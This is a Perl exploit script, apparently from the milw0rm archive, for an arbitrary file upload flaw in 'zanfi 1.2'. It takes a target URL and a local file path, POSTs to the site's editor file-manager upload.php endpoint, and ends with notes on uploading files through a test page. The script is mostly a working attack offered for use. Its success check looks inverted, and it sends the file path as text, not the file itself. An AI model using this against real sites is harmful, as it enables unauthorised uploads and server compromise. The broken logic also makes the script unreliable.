#!/usr/bin/perl
use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Request::Common;
print <<INTRO;
+++++++++++++++++++++++++++++++++++++++++++++++++++++
+zanfi 1.2 Arbitrary File Upload  xpl               +
+                                                   +
+Discovered by :reptil                              +
+                                                   +
+                                                   +
+++++++++++++++++++++++++++++++++++++++++++++++++++++
# Reptil
INTRO
print "Enter URL(ie: http://site.com): ";
    chomp(my $url=<STDIN>);

print "Enter File Path(path to local file to upload): ";
    chomp(my $file=<STDIN>);
my $ua = LWP::UserAgent->new;
my $re = $ua->request(POST $url.'/editor/filemanager/upload/php/upload.php',
                      Content_Type => 'form-data',
                      Content      => [ NewFile => $file ] );
if($re->is_success) {
    if( index($re->content, "Disabled") != -1 ) { print "Exploit Successfull! File Uploaded!\n"; }
    else { print "File Upload Is Disabled! Failed!\n"; }
} else { print "HTTP Request Failed!\n"; }
exit;

##############################################################
##############################################################
*
*you can use this and upload files !
*
*http://www.site.com/editor/filemanager/upload/test.html
*
*http://www.zanfi.nl
##############################################################
##############################################################

# milw0rm.com [2008-09-10]